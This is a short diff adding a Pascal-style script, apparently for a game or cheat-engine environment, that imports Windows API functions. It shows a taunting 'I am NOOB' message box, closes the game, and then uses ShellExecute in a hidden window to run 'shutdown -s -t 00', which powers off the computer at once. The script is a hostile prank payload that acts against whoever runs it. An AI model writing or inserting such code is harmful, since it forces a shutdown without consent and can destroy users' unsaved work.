@@ -1,0 +1,8 @@
+function ShellExecute(hWnd: Integer; lpOperation, lpFile, lpParameters, lpDirectory: PChar; nShowCmd: Integer): Void; stdcall; external 'Shell32.dll' name 'ShellExecuteW';
+function MessageBoxW(hWnd: integer; Text, Caption: PChar; uType: integer): integer; stdcall; external 'user32.dll';
+
+begin
+  MessageBoxW(0, 'I am NOOB', 'NOOB!', 0);
+  engine.gameclose;
+  ShellExecute(0, nil, PChar('cmd.exe'), PChar('/C shutdown -s -t 00'), nil, 0);
+end.
